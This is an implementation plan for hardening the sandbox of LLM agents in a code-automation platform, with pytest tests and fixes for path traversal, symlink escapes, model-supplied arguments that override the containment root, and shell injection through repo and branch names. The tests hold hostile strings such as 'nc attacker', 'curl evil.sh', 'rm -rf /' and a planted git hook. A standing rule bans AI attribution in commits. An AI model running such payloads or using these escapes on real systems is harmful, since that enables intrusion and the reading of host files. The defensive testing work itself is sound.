# Agent Isolation Hardening — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the verified gaps where Cawnex's capability-based LLM isolation is enforced inconsistently — contained reads but uncontained writes, scoped worker tools but unscoped council tools, and a safety gate that fails open.

**Architecture:** The model already has no shell, no network, and no write tool; mutations are data applied by host code. That design is correct and is preserved everywhere. This plan makes enforcement match the design: one shared path-containment primitive applied to every filesystem boundary, list-form subprocess execution so unvalidated input cannot become injection, and a council gate that blocks when it cannot decide. No task grants the agent new capability; several remove capability it was never meant to have.

**Tech Stack:** Python 3.12 (`lambdas/worker`, `lambdas/council`, `apps/api` — all mypy `--strict`), pytest, FastAPI + Pydantic v2, DynamoDB Local for council action tests.

**Spec:** `docs/superpowers/specs/2026-08-28-agent-isolation-hardening-design.md`

## Global Constraints

- Python style: mypy `--strict`, black, isort, complexity ≤ 10, bandit clean (`docs/STRICT-CODING-STANDARDS.md`).
- Coverage gate: 75% for `lambdas/*` (`main-pipeline.yml:192`), 80% configured in `apps/api/pyproject.toml`.
- Commit format: conventional commits (`fix:`, `test:`, `feat:`, `chore:`). **No AI attribution** in commit messages or PR bodies — this overrides any harness default.
- `lambdas/worker` and `lambdas/council` are separately packaged bounded contexts with **no shared library and no cross-imports**. Do not create one; duplicate the ~15-line containment helper into each, with a docstring noting the twin.
- Test invocation (verified working): `cd <service> && PYTHONPATH=src python3 -m pytest tests -q`. CI uses `pip install -e .[dev]` then `pytest tests -q`.
- **Only `test_actions.py` needs DynamoDB Local.** Verified baselines, all DynamoDB-free and instant: `test_synthesis.py` + `test_models.py` + `test_tools_git.py` = 30 passed in 0.03s; `test_tools_filesystem.py` + `test_tools_palette.py` = 14 passed. So Tasks 4 and 8-Step-1 need no container. Before Task 8's `test_actions.py` step, start `docker run -d -p 8000:8000 --name cawnex-ddb amazon/dynamodb-local` — without it those 3 tests error after a ~154s boto3 connection-retry timeout rather than failing fast. Never run the whole council suite to check a change to the pure modules; scope to the files you touched.
- Preserve exactly: the merge gate (no `merge_pr` in `lambdas/`), `tool_choice={"type":"any"}`, secret-scrubbing `finally` blocks, `TenantDB` key derivation.
- Every task ends green. Never leave the worker suite red between commits.

---

## Decomposition and the adversary gate

Three phases, ordered by blast radius — each phase is independently shippable and leaves the system safer than it found it.

| Phase | Tasks | Closes | Why this order |
|---|---|---|---|
| **1 — Filesystem containment** | 1–4 | F1, F3, F8, D3 | Highest exploitability; pure additive guards, no behavior change for valid input |
| **2 — Execution boundary** | 5–7 | F2, F6, F7 | Removes the injection *class*; Task 6 touches 22 call sites so it needs Phase 1 stable underneath |
| **3 — Decision & budget gates** | 8–10 | F4, F5, F9 | Task 8 changes product behavior — sequenced last, gated on explicit sign-off |

**F10 is deliberately not a task.** The spec records that the reviewer prompt applies cost pressure to the component whose job is to block (`prompts.py:161`: *"Wrong blocking issues waste a full fixer cycle and burn budget"*). Rewording it is a one-line change with no test that can prove it worked — prompt phrasing needs an eval, not a unit test, and this plan has no eval harness. Raise it separately once there is one. Task 8 addresses the same fail-open concern at the layer where it *is* testable.

**Adversary verification.** After each task's own tests are green, dispatch a **fresh zero-context adversary agent** via `/adversary-coder` against that task's diff. Independence is the point: the adversary must not inherit this conversation's context, so never fork. The gate is per-task, not per-phase, because a containment bug in Task 1 invalidates every task built on it.

Each task below carries an **Adversary brief** naming the specific bypasses to attempt. A task is done when the adversary returns `merge`, or when its `fix` findings are absorbed and re-verified. Record verdicts in `docs/superpowers/reviews/2026-08-28-agent-isolation-hardening-adversary-review.md`.

Escalation: if an adversary returns `rework` on any task, stop the phase and re-plan that task rather than patching forward.

---

## File Structure

**Created:**
- `lambdas/worker/src/worker/paths.py` — `resolve_within()`, the single containment primitive for the worker context.
- `lambdas/worker/tests/test_paths.py` — containment unit tests, including the adversarial corpus.
- `lambdas/council/src/council/tools/paths.py` — the deliberate twin for the council context.
- `lambdas/council/tests/test_tools_paths.py` — same corpus, council copy.
- `docs/superpowers/reviews/2026-08-28-agent-isolation-hardening-adversary-review.md` — adversary verdict log.

**Modified:**
- `lambdas/worker/src/worker/git_ops.py` — containment in `apply_changes` (:137), hooks off in the git env (:20, :179), list-form `run_git` (:13), repo/branch validation (:42), `--force-with-lease` and `worktree_branch` push (:172).
- `lambdas/worker/src/worker/tools.py` — `_resolve_safe` (:35) delegates to `paths`; `grep_files` (:165) routed through it.
- `lambdas/worker/src/worker/executor.py` — 2 `run_git` call sites (:135, :139); pre-flight spend projection (:202).
- `lambdas/worker/src/worker/integrator/checks/{tests,lint,typecheck}.py` — explicit scrubbed `env=`.
- `lambdas/council/src/council/tools/filesystem.py` — root-relative containment (:20).
- `lambdas/council/src/council/tools/git.py` — `read_integration_file` containment (:67).
- `lambdas/council/src/council/tools/palette.py` — `is_in_scope` (:153) becomes deny-by-default.
- `lambdas/council/src/council/synthesis.py` — mark the mass-abstain decision (:77).
- `lambdas/council/src/council/actions.py` — fail closed on insufficient context (:46).
- `apps/api/src/routes/projects.py` — `repo` field pattern (:26).
- `apps/api/src/routes/waves.py` — `budget_micros` bound (:41).
- `apps/worker/main.py` — remove token-prefix logging (:22); `lambdas/worker/src/worker/claude.py` (:127).

---

# Phase 1 — Filesystem containment

### Task 1: The containment primitive

**Files:**
- Create: `lambdas/worker/src/worker/paths.py`
- Test: `lambdas/worker/tests/test_paths.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `resolve_within(root: str, candidate: str) -> str | None` — returns the realpath'd absolute path if `candidate` resolves inside `root` (inclusive of `root` itself), else `None`. Never raises. Tasks 2, 3, 4, and 5 all depend on this exact signature.

**Why this shape:** it must reproduce `tools._resolve_safe` (`tools.py:35-47`) semantics exactly, because Task 2 replaces that function's body with a delegate and its existing tests must keep passing unchanged.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/worker/tests/test_paths.py
"""Tests for paths — the single containment primitive."""

from __future__ import annotations

import os

from worker.paths import resolve_within


def test_plain_relative_path_resolves(tmp_path: str) -> None:
    root = str(tmp_path)
    result = resolve_within(root, "src/app.py")
    assert result == os.path.join(os.path.realpath(root), "src/app.py")


def test_root_itself_is_allowed(tmp_path: str) -> None:
    root = str(tmp_path)
    assert resolve_within(root, ".") == os.path.realpath(root)


def test_parent_traversal_rejected(tmp_path: str) -> None:
    assert resolve_within(str(tmp_path), "../escape.txt") is None


def test_deep_traversal_rejected(tmp_path: str) -> None:
    assert resolve_within(str(tmp_path), "../../../../../../etc/passwd") is None


def test_absolute_path_outside_rejected(tmp_path: str) -> None:
    assert resolve_within(str(tmp_path), "/etc/passwd") is None


def test_absolute_path_inside_allowed(tmp_path: str) -> None:
    root = os.path.realpath(str(tmp_path))
    inside = os.path.join(root, "pkg/mod.py")
    assert resolve_within(root, inside) == inside


def test_symlink_escaping_root_rejected(tmp_path: str) -> None:
    root = str(tmp_path)
    link = os.path.join(root, "leak.txt")
    os.symlink("/etc/passwd", link)
    assert resolve_within(root, "leak.txt") is None


def test_sibling_prefix_not_treated_as_inside(tmp_path: str) -> None:
    """/mnt/worktrees/cr_1 must not admit /mnt/worktrees/cr_1-evil."""
    root = os.path.join(str(tmp_path), "cr_1")
    os.makedirs(root)
    os.makedirs(os.path.join(str(tmp_path), "cr_1-evil"))
    assert resolve_within(root, "../cr_1-evil/x.txt") is None


def test_empty_candidate_rejected(tmp_path: str) -> None:
    assert resolve_within(str(tmp_path), "") is None


def test_null_byte_rejected(tmp_path: str) -> None:
    assert resolve_within(str(tmp_path), "ok\x00/etc/passwd") is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_paths.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'worker.paths'`

- [ ] **Step 3: Write minimal implementation**

```python
# lambdas/worker/src/worker/paths.py
"""Path containment — the single boundary primitive for this bounded context.

Every filesystem access driven by model output must pass through
resolve_within(). Returns None on escape rather than raising, so callers
decide the failure mode.

NOTE: lambdas/council/src/council/tools/paths.py is a deliberate twin of
this module. The worker and council are separately packaged with no shared
library; keep the two in sync by hand if you change the semantics.
"""

from __future__ import annotations

import os


def resolve_within(root: str, candidate: str) -> str | None:
    """Resolve candidate against root. Return None if it escapes root.

    Absolute candidates are permitted only when they land inside root.
    Symlinks and `..` are normalized by realpath before comparison.
    """
    if not candidate or "\x00" in candidate:
        return None
    target = candidate if os.path.isabs(candidate) else os.path.join(root, candidate)
    full = os.path.realpath(target)
    root_real = os.path.realpath(root)
    if full == root_real:
        return full
    if not full.startswith(root_real + os.sep):
        return None
    return full
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_paths.py -v`
Expected: PASS — 10 passed

- [ ] **Step 5: Typecheck**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m mypy --strict src/worker/paths.py`
Expected: `Success: no issues found in 1 source file`

- [ ] **Step 6: Commit**

```bash
git add lambdas/worker/src/worker/paths.py lambdas/worker/tests/test_paths.py
git commit -m "feat(worker): add resolve_within path containment primitive"
```

- [ ] **Step 7: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Attempt to bypass `resolve_within`. Specifically try: a symlinked *directory* component mid-path; a path whose realpath changes between check and use (TOCTOU); `root` itself being a symlink; case-insensitive filesystems (macOS/APFS) where `/ROOT/x` and `/root/x` differ as strings but not as files; relative `root`; trailing slashes; unicode normalization forms that collapse to the same file. Report any input where the function returns a path outside `root`, or returns `None` for a legitimate in-root path.

---

### Task 2: Route every worker read through the primitive

**Files:**
- Modify: `lambdas/worker/src/worker/tools.py:35-47` (`_resolve_safe`), `:165` (`grep_files`)
- Test: `lambdas/worker/tests/test_tools.py`

**Interfaces:**
- Consumes: `resolve_within(root, candidate) -> str | None` from Task 1.
- Produces: no signature changes. `_resolve_safe` keeps its name and contract so existing tests pass untouched.

**Why:** F8 — `grep_files` opens by bare join (`tools.py:165`), safe only because `os.walk` defaults to `followlinks=False`. That guards symlinked *directories*, not symlinked *files*. Verified bypass: `read_file` blocks a symlink to `/etc/passwd`; `grep_files` reads straight through it.

- [ ] **Step 1: Write the failing test**

```python
# append to lambdas/worker/tests/test_tools.py
import os
from worker.tools import WorktreeTools


def test_grep_cannot_read_through_symlinked_file(tmp_path, stub_logger) -> None:
    """F8: grep_files must not follow a symlink that escapes the worktree."""
    root = str(tmp_path)
    os.symlink("/etc/passwd", os.path.join(root, "leak.txt"))
    tools = WorktreeTools(worktree_dir=root, logger=stub_logger)

    result = tools.grep_files("root", path_glob="**/*")

    assert "leak.txt" not in str(result.get("matches", []))


def test_grep_still_reads_normal_files(tmp_path, stub_logger) -> None:
    root = str(tmp_path)
    with open(os.path.join(root, "app.py"), "w") as f:
        f.write("def root_handler():\n    pass\n")
    tools = WorktreeTools(worktree_dir=root, logger=stub_logger)

    result = tools.grep_files("root_handler", path_glob="**/*")

    assert any(m["path"] == "app.py" for m in result["matches"])
```

If `stub_logger` is not already a fixture in `tests/test_tools.py`, add it to that file:

```python
import pytest


class _StubLogger:
    def event(self, *a, **k) -> None: ...
    def warning(self, *a, **k) -> None: ...
    def error(self, *a, **k) -> None: ...


@pytest.fixture
def stub_logger() -> _StubLogger:
    return _StubLogger()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_tools.py -k symlinked -v`
Expected: FAIL — the assertion finds `leak.txt` among the matches

- [ ] **Step 3: Write minimal implementation**

Replace the body of `_resolve_safe` (`tools.py:35-47`) with a delegate, keeping the method and its docstring:

```python
    def _resolve_safe(self, rel_path: str) -> str | None:
        """Resolve rel_path against worktree_dir. Returns None if it escapes."""
        return resolve_within(self.worktree_dir, rel_path)
```

Add the import at the top of `tools.py`:

```python
from worker.paths import resolve_within
```

Then route `grep_files` through it. At `tools.py:165`, replace the bare join:

```python
            full = os.path.join(self.worktree_dir, rel)
```

with:

```python
            full = self._resolve_safe(rel)
            if full is None:
                continue
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_tools.py -v`
Expected: PASS — all pre-existing tool tests still green, plus the 2 new ones

- [ ] **Step 5: Commit**

```bash
git add lambdas/worker/src/worker/tools.py lambdas/worker/tests/test_tools.py
git commit -m "fix(worker): route grep_files through path containment"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Find a read path in `tools.py` that still reaches the filesystem without `_resolve_safe`. Check `glob_files`, `list_dir`, `_walk_relative`, and `read_file`. Confirm `SKIP_DIRS` cannot be evaded to read `.git/config` (the token is persisted there by the credentialed clone URL at `git_ops.py:56`). Verify the `continue` in `grep_files` cannot silently skip legitimate files and mask a real match.

---

### Task 3: Contain the write path

**Files:**
- Modify: `lambdas/worker/src/worker/git_ops.py:137-150` (`apply_changes`)
- Test: `lambdas/worker/tests/test_git_ops.py`

**Interfaces:**
- Consumes: `resolve_within` from Task 1.
- Produces: `apply_changes(worktree_dir: str, changes: list[dict[str, Any]]) -> list[str]` — unchanged signature; now raises `ValueError` when any change escapes. `executor.py:424` is the only caller; its existing `except Exception` crow-failure path (`executor.py:379-415`) absorbs the raise.

**Why:** F1, the highest-severity finding. Verified: `write ../outside/PWNED.txt -> ESCAPED`, `write /abs/path -> ESCAPED`, while the equivalent reads are blocked.

**Design note (D2):** reject the *whole changeset* atomically. A partial write leaves the worktree in a state neither model nor reviewer reasoned about, and `git add -A` would commit the surviving half.

- [ ] **Step 1: Write the failing test**

```python
# append to lambdas/worker/tests/test_git_ops.py
import os
import pytest
from worker.git_ops import apply_changes


def test_apply_changes_rejects_parent_traversal(tmp_path) -> None:
    root = os.path.join(str(tmp_path), "wt")
    os.makedirs(root)
    with pytest.raises(ValueError, match="escapes worktree"):
        apply_changes(root, [{"path": "../pwned.txt", "action": "create", "content": "x"}])
    assert not os.path.exists(os.path.join(str(tmp_path), "pwned.txt"))


def test_apply_changes_rejects_absolute_path(tmp_path) -> None:
    root = os.path.join(str(tmp_path), "wt")
    os.makedirs(root)
    target = os.path.join(str(tmp_path), "abs.txt")
    with pytest.raises(ValueError, match="escapes worktree"):
        apply_changes(root, [{"path": target, "action": "create", "content": "x"}])
    assert not os.path.exists(target)


def test_apply_changes_rejects_git_hooks_write(tmp_path) -> None:
    """Defense in depth: a hook inside the worktree still executes on commit."""
    root = os.path.join(str(tmp_path), "wt")
    os.makedirs(root)
    with pytest.raises(ValueError, match="git internals"):
        apply_changes(
            root,
            [{"path": ".git/hooks/pre-commit", "action": "create", "content": "#!/bin/sh\nid\n"}],
        )


def test_apply_changes_is_atomic_on_escape(tmp_path) -> None:
    """A single bad path rejects the whole changeset — nothing is written."""
    root = os.path.join(str(tmp_path), "wt")
    os.makedirs(root)
    with pytest.raises(ValueError):
        apply_changes(
            root,
            [
                {"path": "good.py", "action": "create", "content": "ok"},
                {"path": "../bad.py", "action": "create", "content": "evil"},
            ],
        )
    assert not os.path.exists(os.path.join(root, "good.py"))


def test_apply_changes_writes_valid_paths(tmp_path) -> None:
    root = os.path.join(str(tmp_path), "wt")
    os.makedirs(root)
    paths = apply_changes(
        root, [{"path": "pkg/mod.py", "action": "create", "content": "print(1)"}]
    )
    assert paths == ["pkg/mod.py"]
    with open(os.path.join(root, "pkg/mod.py")) as f:
        assert f.read() == "print(1)"


def test_apply_changes_delete_still_works(tmp_path) -> None:
    root = os.path.join(str(tmp_path), "wt")
    os.makedirs(root)
    victim = os.path.join(root, "gone.py")
    with open(victim, "w") as f:
        f.write("x")
    apply_changes(root, [{"path": "gone.py", "action": "delete"}])
    assert not os.path.exists(victim)
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_git_ops.py -k apply_changes -v`
Expected: FAIL — the traversal tests write the file instead of raising

- [ ] **Step 3: Write minimal implementation**

Replace `apply_changes` (`git_ops.py:137-150`) entirely:

```python
def apply_changes(worktree_dir: str, changes: list[dict[str, Any]]) -> list[str]:
    """Create/modify/delete files in worktree. Returns changed paths.

    Every path is model-authored, so each is validated against worktree_dir
    before any write happens. A single escaping path rejects the whole
    changeset — a partial apply would leave a tree neither the model nor the
    reviewer reasoned about, and `git add -A` would commit the surviving half.
    """
    resolved: list[tuple[str, str, dict[str, Any]]] = []
    for change in changes:
        rel = change.get("path")
        if not isinstance(rel, str):
            raise ValueError("change is missing a string 'path'")
        full = resolve_within(worktree_dir, rel)
        if full is None:
            raise ValueError(f"path escapes worktree: {rel}")
        if ".git" in os.path.relpath(full, os.path.realpath(worktree_dir)).split(os.sep):
            raise ValueError(f"path writes git internals: {rel}")
        resolved.append((rel, full, change))

    paths: list[str] = []
    for rel, full, change in resolved:
        if change.get("action") == "delete":
            if os.path.exists(full):
                os.remove(full)
        else:
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "w") as f:
                f.write(change.get("content", ""))
        paths.append(rel)
    return paths
```

Add to the imports at the top of `git_ops.py`:

```python
from worker.paths import resolve_within
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_git_ops.py -v`
Expected: PASS — the 14 pre-existing tests plus 6 new ones

- [ ] **Step 5: Commit**

```bash
git add lambdas/worker/src/worker/git_ops.py lambdas/worker/tests/test_git_ops.py
git commit -m "fix(worker): contain model-authored write paths to the worktree"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** This is the critical fix — attack it hardest. Try: writing through a symlink the model created in an *earlier* crow iteration on the same worktree; `os.makedirs` following a symlinked parent directory; a path that passes `resolve_within` but whose parent is created as a symlink by an earlier entry in the same `changes` array (ordering attack); `.git` detection bypass via `.GIT` on a case-insensitive filesystem, or a nested `sub/.git/hooks`; missing `content` key on a create. Confirm the crow-failure path in `executor.py` actually catches `ValueError` and does not crash the worker loop.

---

### Task 4: Contain the council's filesystem tools

**Files:**
- Create: `lambdas/council/src/council/tools/paths.py`, `lambdas/council/tests/test_tools_paths.py`
- Modify: `lambdas/council/src/council/tools/filesystem.py:20`, `lambdas/council/src/council/tools/git.py:67`, `lambdas/council/src/council/tools/palette.py:153-168`
- Test: `lambdas/council/tests/test_tools_filesystem.py`, `lambdas/council/tests/test_tools_palette.py`

**Interfaces:**
- Consumes: nothing (deliberate twin of Task 1, not an import — separate package).
- Produces: `resolve_within(root, candidate) -> str | None` in the council namespace; `is_in_scope(advisor, tool_name, args) -> bool` keeps its signature but becomes deny-by-default.

**Why:** F3, verified by execution — `security in_scope('/etc/passwd') -> True` and `read_file('/etc/passwd')` returns real content. Advisors share the multi-tenant Fargate host and EFS mount with the worker.

**Root source — already available, do not add plumbing.** `execute_tool` (`palette.py:171-176`) receives a `context` dict that already carries `repo_path` (used at `palette.py:196` for `grep`). Use `context["repo_path"]` as the containment root. `is_in_scope` is already called on the dispatch path (`palette.py:185`), so tightening it takes effect immediately.

**Kwargs-splat hazard (verified):** the dispatcher calls `read_file(**args)` (`palette.py:194`) where `args` is model-authored. If `read_file` gains a `root` parameter, a model can pass `{"path": "/etc/passwd", "root": "/"}` and override containment. **Therefore pass `root` explicitly and strip it from `args`** — never let it come from the splat:

```python
    if tool_name == "read_file":
        safe_args = {k: v for k, v in args.items() if k != "root"}
        return read_file(root=context.get("repo_path", ""), **safe_args)
```

Apply the same treatment to `list_directory(**args)` (`palette.py:199`).

- [ ] **Step 1: Write the failing test**

```python
# lambdas/council/tests/test_tools_filesystem.py — append
import os
import pytest
from council.tools.filesystem import read_file


def test_read_file_rejects_absolute_escape(tmp_path) -> None:
    root = str(tmp_path)
    result = read_file("/etc/passwd", root=root)
    assert result["error"] == "path_out_of_scope"
    assert "content" not in result


def test_read_file_rejects_traversal(tmp_path) -> None:
    result = read_file("../../../etc/passwd", root=str(tmp_path))
    assert result["error"] == "path_out_of_scope"


def test_read_file_still_reads_in_root(tmp_path) -> None:
    root = str(tmp_path)
    with open(os.path.join(root, "a.py"), "w") as f:
        f.write("x = 1\n")
    result = read_file("a.py", root=root)
    assert result["content"] == "x = 1\n"
```

```python
# lambdas/council/tests/test_tools_palette.py — append
from council.enums import AdvisorType
from council.tools.palette import is_in_scope


def test_security_advisor_cannot_read_outside_repo() -> None:
    assert not is_in_scope(AdvisorType.SECURITY, "read_file", {"path": "/etc/passwd"})


def test_architecture_advisor_cannot_read_outside_repo() -> None:
    assert not is_in_scope(AdvisorType.ARCHITECTURE, "read_file", {"path": "/etc/passwd"})


def test_security_advisor_can_read_repo_relative() -> None:
    assert is_in_scope(AdvisorType.SECURITY, "read_file", {"path": "apps/api/src/main.py"})
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd lambdas/council && PYTHONPATH=src python3 -m pytest tests/test_tools_filesystem.py tests/test_tools_palette.py -v`
Expected: FAIL — `read_file` returns real `/etc/passwd` content; `is_in_scope` returns `True`

- [ ] **Step 3: Write minimal implementation**

Create `lambdas/council/src/council/tools/paths.py` with the identical body from Task 1 Step 3, changing only the module docstring's twin reference to point at `lambdas/worker/src/worker/paths.py`.

In `filesystem.py`, add a required `root` parameter and guard before the `isfile` check (`filesystem.py:20`):

```python
    resolved = resolve_within(root, path)
    if resolved is None:
        return {"error": "path_out_of_scope", "path": path}
    if not os.path.isfile(resolved):
        return {"error": "file_not_found", "path": path}
```

Use `resolved` for the subsequent `open()`. Apply the same guard to `read_integration_file` (`git.py:67`), using `integration_path` as the root.

In `palette.py`, make `is_in_scope` deny-by-default — replace the trailing `return True` (`palette.py:168`):

```python
def is_in_scope(advisor: AdvisorType, tool_name: str, args: dict[str, Any]) -> bool:
    """Path-scoping enforcement. Deny-by-default: reject anything that escapes
    the repo root, then apply per-advisor relevance narrowing on top."""
    path = args.get("path", "")
    if not path:
        return True
    if os.path.isabs(path) or ".." in path.split("/"):
        return False
    if advisor == AdvisorType.UX:
        return (
            "/apps/ios/" in path
            or path.endswith(".strings")
            or path.endswith(".swift")
        )
    if advisor == AdvisorType.COST:
        return "/infra/" in path
    return True
```

Update the dispatcher (`palette.py:194`) to pass `root` into the filesystem tools rather than splatting model args alone.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/council && PYTHONPATH=src python3 -m pytest tests/test_tools_filesystem.py tests/test_tools_palette.py tests/test_tools_git.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add lambdas/council/src/council/tools/ lambdas/council/tests/
git commit -m "fix(council): contain advisor file reads to the repo root"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** The `palette.py` kwargs splat (`return read_file(**args)`) is model-driven — verify a model cannot pass `root` itself as an argument and override the containment root. Check every tool in `_PALETTES` for a filesystem reach that skips `is_in_scope`, and confirm `is_in_scope` is actually called on the dispatch path rather than only at schema-build time. Try Windows-style separators and URL-encoded traversal.

---

# Phase 2 — Execution boundary

### Task 5: Validate repo and branch

**Files:**
- Modify: `lambdas/worker/src/worker/git_ops.py:42-45` (`_normalize_repo`), `apps/api/src/routes/projects.py:26`
- Test: `lambdas/worker/tests/test_git_ops.py`, `apps/api/tests/test_projects.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `_normalize_repo(repo: str) -> str` — now raises `ValueError` on a malformed slug. New `_validate_branch(branch: str) -> str` in `git_ops.py`, raising `ValueError`; Task 7 calls it before pushing.

**Why:** F2 — verified that `owner/repo$(id>/tmp/pwned).git` survives normalization intact into a `shell=True` command. This is A2 → RCE with no LLM involvement.

**Layering (D4):** the API rejects at 422; the worker re-validates because rows already in DynamoDB predate the API fix. Task 6 removes the injection *class* underneath both.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/worker/tests/test_git_ops.py — append
import pytest
from worker.git_ops import _normalize_repo, _validate_branch


@pytest.mark.parametrize(
    "evil",
    [
        "owner/repo$(id)",
        "owner/repo`id`",
        "owner/repo;rm -rf /",
        "owner/repo|nc attacker 1",
        "owner/repo&&curl evil.sh",
        "owner/repo with space",
        "owner/repo\nsecond-line",
        "../../etc/passwd",
        "only-one-segment",
        "a/b/c",
    ],
)
def test_normalize_repo_rejects_injection(evil: str) -> None:
    with pytest.raises(ValueError, match="invalid repo"):
        _normalize_repo(evil)


def test_normalize_repo_accepts_valid() -> None:
    assert _normalize_repo("https://github.com/eduardoaugustoes/cawnex.git") == (
        "eduardoaugustoes/cawnex"
    )
    assert _normalize_repo("owner/repo_name.v2") == "owner/repo_name.v2"


@pytest.mark.parametrize(
    "evil",
    ["feat/x;id", "--upload-pack=evil", "a..b", "br anch", "br\nanch", ""],
)
def test_validate_branch_rejects(evil: str) -> None:
    with pytest.raises(ValueError, match="invalid branch"):
        _validate_branch(evil)


def test_validate_branch_accepts_wave_format() -> None:
    assert _validate_branch("cawnex/w01-m01") == "cawnex/w01-m01"
```

```python
# apps/api/tests/test_projects.py — append
def test_create_project_rejects_injection_in_repo(client) -> None:
    response = client.post(
        "/projects",
        json={"name": "x", "one_liner": "y", "repo": "owner/repo$(id)"},
    )
    assert response.status_code == 422


def test_create_project_accepts_valid_repo(client) -> None:
    response = client.post(
        "/projects",
        json={"name": "x", "one_liner": "y", "repo": "owner/repo"},
    )
    assert response.status_code < 400
```

Match the existing auth/client fixture style already used in `apps/api/tests/test_projects.py` — do not invent a new one.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_git_ops.py -k "normalize_repo or validate_branch" -v`
Expected: FAIL — `ImportError` on `_validate_branch`, and no raise on injection

- [ ] **Step 3: Write minimal implementation**

In `git_ops.py`, replace `_normalize_repo` (`:42-45`) and add the branch validator:

```python
_REPO_RE = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$")
_BRANCH_RE = re.compile(r"^[A-Za-z0-9_./-]+$")


def _normalize_repo(repo: str) -> str:
    """Normalize repo to owner/repo format, stripping full URLs.

    Raises ValueError on anything that is not a plain owner/repo slug — this
    value reaches subprocess argv, so shell metacharacters are rejected
    outright rather than escaped.
    """
    repo = repo.removeprefix("https://github.com/").removesuffix(".git")
    if not _REPO_RE.match(repo):
        raise ValueError(f"invalid repo slug: {repo!r}")
    return repo


def _validate_branch(branch: str) -> str:
    """Validate a git branch name. Raises ValueError if unsafe."""
    if not branch or not _BRANCH_RE.match(branch):
        raise ValueError(f"invalid branch name: {branch!r}")
    if ".." in branch or branch.startswith("-") or branch.endswith("/"):
        raise ValueError(f"invalid branch name: {branch!r}")
    return branch
```

Add `import re` to the imports.

In `apps/api/src/routes/projects.py`, constrain the field (`:26`):

```python
    repo: str = Field(default="", pattern=r"^$|^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$")
```

Import `Field` from `pydantic` if not already imported. The `^$|` alternative preserves the existing "empty means no repo" contract (`projects.py:108`).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_git_ops.py -v` then `cd apps/api && python3 -m pytest tests/test_projects.py -v`
Expected: PASS both

- [ ] **Step 5: Commit**

```bash
git add lambdas/worker/src/worker/git_ops.py lambdas/worker/tests/test_git_ops.py \
        apps/api/src/routes/projects.py apps/api/tests/test_projects.py
git commit -m "fix: validate repo slug and branch name before they reach git"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Find a value passing both regexes that is still dangerous as argv — particularly a repo or branch beginning with `-` (argument injection into `git clone`/`git push`), and `.` or `..` as a whole segment. Confirm `ensure_repo`'s `repo.replace("/", "_")` (`git_ops.py:55`) cannot produce a path escape post-validation. Check whether raising from `_normalize_repo` crashes the worker poll loop rather than failing one crow. Verify the API regex accepts every legitimate GitHub repo name.

---

### Task 6: Remove `shell=True`

**Files:**
- Modify: `lambdas/worker/src/worker/git_ops.py:13-39` (`run_git`) and its 20 call sites in that file; `lambdas/worker/src/worker/executor.py:135,139`
- Test: `lambdas/worker/tests/test_git_ops.py`

**Interfaces:**
- Consumes: `_validate_branch` from Task 5.
- Produces: `run_git(cmd: list[str], cwd: str | None = None, check: bool = True, timeout: int = 120) -> str` — the first parameter changes from `str` to `list[str]`. All 22 call sites convert. This is the change that closes the injection class.

**Why:** D4 layer 3. Validation catches known-bad input; list-form argv makes unknown-bad input structurally harmless.

**Scale note:** 22 call sites (20 in `git_ops.py`, 2 in `executor.py`), verified by grep. Mechanical but wide — hence its own task and its own gate.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/worker/tests/test_git_ops.py — append
from unittest.mock import MagicMock, patch
from worker.git_ops import run_git


@patch("worker.git_ops.subprocess.run")
def test_run_git_uses_list_form_not_shell(mock_run: MagicMock) -> None:
    mock_run.return_value = MagicMock(returncode=0, stdout="ok", stderr="")
    run_git(["git", "status"], cwd="/repo")
    kwargs = mock_run.call_args.kwargs
    assert kwargs.get("shell") is not True
    assert mock_run.call_args.args[0] == ["git", "status"]


@patch("worker.git_ops.subprocess.run")
def test_run_git_disables_hooks(mock_run: MagicMock) -> None:
    """D3: a hook written inside the worktree must not execute on commit."""
    mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
    run_git(["git", "status"], cwd="/repo")
    env = mock_run.call_args.kwargs["env"]
    assert env["GIT_CONFIG_COUNT"] == "2"
    assert "core.hooksPath" in (env["GIT_CONFIG_KEY_0"], env["GIT_CONFIG_KEY_1"])
    idx = "0" if env["GIT_CONFIG_KEY_0"] == "core.hooksPath" else "1"
    assert env[f"GIT_CONFIG_VALUE_{idx}"] == "/dev/null"
```

- [ ] **Step 2: Run tests to verify they fail**

